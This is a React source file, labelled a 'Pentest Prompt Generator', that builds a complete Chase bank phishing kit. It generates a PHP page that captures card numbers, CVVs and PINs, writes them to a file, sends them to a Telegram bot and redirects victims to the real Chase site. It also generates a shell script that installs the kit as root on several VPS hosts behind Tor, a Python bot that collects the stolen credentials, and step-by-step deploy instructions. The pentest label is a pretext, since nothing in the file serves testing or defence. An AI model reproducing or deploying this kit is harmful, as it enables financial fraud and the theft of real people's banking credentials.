import { useState } from 'react';

function App() {
  const [vpsList, setVpsList] = useState('vps1.nicevps.net\nvps2.nicevps.net\nvps3.nicevps.net\nvps4.nicevps.net\nvps5.nicevps.net\nvps6.nicevps.net\nvps7.nicevps.net\nvps8.nicevps.net\nvps9.nicevps.net\nvps10.nicevps.net');
  const [telegramToken, setTelegramToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [copied, setCopied] = useState('');

  const generateStealPHP = () => {
    return `<?php
if ($_POST['cardnumber'] && $_POST['cvv'] && $_POST['pin']) {
  $creds = json_encode($_POST);
  file_put_contents('creds.txt', $creds . "\\n", FILE_APPEND);
  
  $message = "🆕 New Chase Creds:\\n" . $creds;
  $url = "https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=" . urlencode($message);
  file_get_contents($url);
  
  header('Location: https://www.chase.com/');
  exit;
}
?>`;
  };

  const generateMultiDeploy = () => {
    const vpsArray = vpsList.split('\\n').filter(v => v.trim());
    const sshCommands = vpsArray.map(vps => 
      `ssh root@${vps} << 'EOF'
apt update && apt install -y nginx php8.1-fpm tor proxychains
cat > /var/www/html/steal.php << 'PHPEND'
${generateStealPHP().replace(/'/g, "'\\''")}
PHPEND
cat > /etc/nginx/sites-available/default << 'NGINXEND'
server {
  listen 80;
  root /var/www/html;
  index index.html steal.php;
  location ~ \\.php$ { fastcgi_pass unix:/run/php/php8.1-fpm.sock; ... }
}
NGINXEND
systemctl restart nginx php8.1-fpm
tor & proxychains nginx -t
EOF`
    ).join('\\n');

    return `# multi_deploy.sh - v9pei phishing kit deploy
#!/bin/bash
${sshCommands}
echo "Deploy complete on ${vpsArray.length} VPS"
`;
  };

  const generateBotPy = () => {
    return `import requests, time
TOKEN = '${telegramToken}'
CHAT_ID = '${chatId}'

def check_creds():
  while True:
    try:
      for vps in ['${vpsList.replace(/\\n/g, "','")}']:
        r = requests.get(f'http://{vps}/creds.txt', timeout=5)
        if 'cardnumber' in r.text:
          requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', 
                       data={'chat_id': CHAT_ID, 'text': f'\\nNew creds from {vps}:\\n' + r.text})
          requests.post(f'http://{vps}/clear_creds.php')
      time.sleep(30)
    except: pass

check_creds()
`;
  };

  const copyToClipboard = (content: string, type: string) => {
    navigator.clipboard.writeText(content).then(() => {
      setCopied(type);
      setTimeout(() => setCopied(''), 2000);
    });
  };

  return (
    <div style={{padding: '20px', maxWidth: '800px', margin: '0 auto'}}>
      <h1>🛡️ Pentest Prompt Generator (v9pei)</h1>
      
      <div style={{margin: '20px 0'}}>
        <label>VPS List (one per line):</label>
        <textarea 
          value={vpsList} 
          onChange={e => setVpsList(e.target.value)}
          rows={6} 
          style={{width: '100%', fontFamily: 'monospace'}}
        />
      </div>

      <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px', margin: '20px 0'}}>
        <div>
          <label>Telegram Token:</label>
          <input value={telegramToken} onChange={e => setTelegramToken(e.target.value)} style={{width: '100%'}} />
        </div>
        <div>
          <label>Chat ID:</label>
          <input value={chatId} onChange={e => setChatId(e.target.value)} style={{width: '100%'}} />
        </div>
      </div>

      <div style={{display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: '15px'}}>
        <div>
          <h3>steal.php</h3>
          <pre style={{background: '#f4f4f4', padding: '10px', fontSize: '12px', maxHeight: '200px', overflow: 'auto'}}>
            {generateStealPHP().substring(0, 300)}...
          </pre>
          <button onClick={() => copyToClipboard(generateStealPHP(), 'steal.php')} 
                  style={{width: '100%', marginTop: '5px'}}>
            📋 Copy steal.php
          </button>
        </div>

        <div>
          <h3>multi_deploy.sh</h3>
          <pre style={{background: '#f4f4f4', padding: '10px', fontSize: '12px', maxHeight: '200px', overflow: 'auto'}}>
            {generateMultiDeploy().substring(0, 300)}...
          </pre>
          <button onClick={() => copyToClipboard(generateMultiDeploy(), 'deploy.sh')} 
                  style={{width: '100%', marginTop: '5px'}}>
            📋 Copy deploy.sh
          </button>
        </div>

        <div>
          <h3>bot.py</h3>
          <pre style={{background: '#f4f4f4', padding: '10px', fontSize: '12px', maxHeight: '200px', overflow: 'auto'}}>
            {generateBotPy().substring(0, 300)}...
          </pre>
          <button onClick={() => copyToClipboard(generateBotPy(), 'bot.py')} 
                  style={{width: '100%', marginTop: '5px'}}>
            📋 Copy bot.py
          </button>
        </div>
      </div>

      {copied && <div style={{color: 'green', textAlign: 'center', marginTop: '10px'}}>
        ✅ {copied} copied to clipboard
      </div>}

      <div style={{marginTop: '30px', padding: '15px', background: '#e8f4fd', borderRadius: '8px'}}>
        <h3>🚀 Deploy Instructions:</h3>
        <ol style={{margin: 0, fontSize: '14px'}}>
          <li>1. Paste VPS IPs/tokens above</li>
          <li>2. Copy scripts → SSH to Replit → <code>chmod +x multi_deploy.sh && ./multi_deploy.sh</code></li>
          <li>3. Run <code>python3 bot.py</code> for Telegram monitoring</li>
          <li>4. Test: <code>curl -d "cardnumber=4111111111111111&cvv=123&pin=1234" http://vps1.nicevps.net/steal.php</code></li>
        </ol>
      </div>
    </div>
  );
}

export default App;
